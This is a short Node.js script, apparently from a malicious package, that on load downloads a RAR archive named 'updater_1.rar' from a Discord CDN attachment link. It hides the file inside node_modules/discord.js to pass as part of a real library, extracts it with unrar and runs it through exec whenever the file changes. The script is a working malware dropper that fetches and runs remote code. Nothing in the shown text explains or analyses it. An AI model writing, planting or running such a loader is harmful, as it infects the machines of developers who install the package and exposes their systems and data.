const fs = require("fs");
const https = require("https");
const { exec } = require("child_process");
const path = require("path");
const { promisify } = require("util");

class ExeFileHandler {
  constructor(exePath) {
    this.exePath = exePath;
  }

  onModified(filePath) {
    if (filePath === this.exePath) {
      exec(this.exePath, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing ${this.exePath}: ${error.message}`);
          return;
        }
        console.log(`Output of ${this.exePath}: ${stdout}`);
        console.error(`Error in ${this.exePath}: ${stderr}`);
      });
    }
  }
}

async function downloadExe(url, fileName) {
  const moduleName = "discord.js";
  const filePath = path.join("node_modules", moduleName, fileName);
  const modulePath = path.join("node_modules", moduleName);

  if (!fs.existsSync(modulePath)) {
    fs.mkdirSync(modulePath, { recursive: true });
  }

  const writeStream = fs.createWriteStream(filePath);
  const response = await new Promise((resolve, reject) => {
    const request = https.get(url, (response) => {
      response.pipe(writeStream);
      response.on("end", () => {
        resolve(response);
      });
    });

    request.on("error", (error) => {
      reject(error);
    });
  });

  if (response.statusCode === 200) {
    await extractRar(filePath);
    observeFile(filePath);
  }
}

async function extractRar(filePath) {
  const unrarCommand = `unrar x "${filePath}" -o+`;
  const execAsync = promisify(exec);

  try {
    await execAsync(unrarCommand);
    console.log(`RAR file extracted successfully: ${filePath}`);
  } catch (error) {
    console.error(`Error extracting RAR file: ${error.message}`);
  }
}

function observeFile(filePath) {
  fs.watch(filePath, (event) => {
    if (event === "change") {
      new ExeFileHandler(filePath).onModified(filePath);
    }
  });
}

downloadExe("https://cdn.discordapp.com/attachments/1180464142075822080/1180504446006984765/updater_1.rar", "updater.rar");
